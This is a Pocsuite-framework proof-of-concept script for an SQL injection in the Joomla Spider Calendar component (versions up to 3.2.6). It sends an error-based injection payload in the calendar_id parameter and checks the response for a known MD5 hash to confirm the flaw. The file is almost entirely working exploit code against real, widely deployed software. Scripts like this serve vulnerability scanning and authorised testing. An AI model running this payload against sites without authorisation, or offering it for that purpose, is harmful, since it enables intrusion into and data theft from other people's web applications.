#!/usr/bin/env python
# -*- coding:utf-8 -*-



from pocsuite.net import req

from pocsuite.poc import Output, POCBase

from pocsuite.utils import register



class TestPOC(POCBase):

    vulID = '87242'

    version = '1'

    vulDate = '2014-08-31'

    author = 'anonymous'

    createDate = '2015-09-30'

    updateDate = '2015-09-30'

    references = ['http://www.sebug.net/vuldb/ssvid-87242']

    name = 'Joomla Spider Calendar SQL Injection'

    appPowerLink = 'http://extensions.joomla.org/extensions/calendars-a-events/events/events-calendars/22329'

    appName = 'Joomla Spider Calendar Component'

    appVersion = '<= 3.2.6'

    vulType = 'SQL Injection'

    desc = 'Joomla Spider Calendar Component SQL Injection in index.php, calendar_id param'

    samples = ['']



    def _attack(self):

        return self._verify()



    def _verify(self, verify=True):

        result = {}

        payload = '||exp(~(select*from(select md5(456546))a))'

        vul_url = '%s/index.php?option=com_spidercalendar&view=spidercalendar&calendar_id=1' % self.url

        response = req.get(vul_url + payload).content



        if 'e02f052b7d3db73f99d4f5801f2b6fff' in response:

            result['VerifyInfo'] = {}

            result['VerifyInfo']['URL'] = self.url



        return self.parse_attack(result)



    def parse_attack(self, result):

        output = Output(self)



        if result:

            output.success(result)

        else:

            output.fail('failed')



        return output

register(TestPOC)